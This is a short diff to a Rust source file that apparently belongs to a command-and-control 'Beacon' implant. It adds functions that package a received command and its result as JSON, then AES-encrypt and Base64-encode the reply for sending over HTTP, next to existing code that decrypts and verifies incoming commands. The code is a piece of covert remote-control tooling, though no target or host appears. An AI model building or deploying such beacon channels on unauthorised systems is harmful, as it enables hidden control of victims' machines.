@@ -29,6 +29,7 @@ use crate::utilities::Utils;
 use anyhow::{anyhow, Result};
 use log::{error};
 use rsa::RsaPrivateKey;
+use serde_json::{Value, json};
 
 // Retrieving the command of that has been sent, along with the AES key that was used to encrypt it.
 pub fn retrieve_command(body: String, private_key: RsaPrivateKey) -> Result<(String, [u8; 32])> {
@@ -61,4 +62,23 @@ pub fn verify_message(body: String, public_key: &str) -> Result<bool> {
     let (_, encrypted_key, signature) = retrieve_info(body)?;
     let public_key = Rsa::load_public_key(&public_key)?;
     Ok(Rsa::verify(public_key, encrypted_key, &signature))
+}
+
+// Code for encoding both commands to send in a JSON format for the Beacon
+pub fn encode_in_json(command: String, result: String) -> Value {
+    let encoded_response = json!({
+        "command": format!("{}", command),
+        "result": format!("{}", result),
+    });
+    encoded_response
+}
+
+// Code for encoding the Value of JSON into a final payload ready to be sent over HTTP
+pub fn format_payload(input: Value, aes_key: [u8; 32]) -> String {
+    if let Ok(encoded_response) = serde_json::to_string(&input) {
+        let encrypted_response = Aes::encrypt(aes_key, encoded_response.as_bytes().to_vec());
+        let encoded_encrypted_response = Base64::encode(&encrypted_response);
+        return encoded_encrypted_response;
+    }
+    "Failed to format response payload".to_string()
 }
